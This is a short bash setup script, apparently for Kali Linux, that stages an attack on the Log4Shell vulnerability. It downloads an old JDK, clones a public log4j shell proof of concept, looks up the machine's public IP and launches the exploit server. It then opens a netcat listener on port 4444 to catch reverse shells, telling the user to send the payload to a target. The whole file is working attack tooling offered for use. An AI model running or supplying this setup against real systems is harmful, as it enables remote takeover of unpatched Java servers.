#!/bin/bash
#kali
#remember to port-forward if setup in home

echo "remember to portforward or open your firewall"


wget https://packages.baidu.com/app/jdk-8/jdk-8u111-linux-x64.tar.gz & 
wget https://bootstrap.pypa.io/get-pip.py
python3 get-pip.py

var_my_ip=$(curl -i ipinfo.io | grep "ip\"" | awk -F '\"' '{print $4}')


git clone https://github.com/kozmer/log4j-shell-poc
cd log4j-shell-poc
python3 -m pip install -r requirements.txt

mv ../jdk-8u111-linux-x64.tar.gz $PWD
tar -xvf jdk-8u111-linux-x64.tar.gz
sed -i 's/jdk1.8.0.20/jdk1.8.0_111/g' poc.py


python3 poc.py --userip $var_my_ip --webport 8000 --lport 4444 & 

echo "listening 4444, type the payload to your target"
nc -nlvp 4444
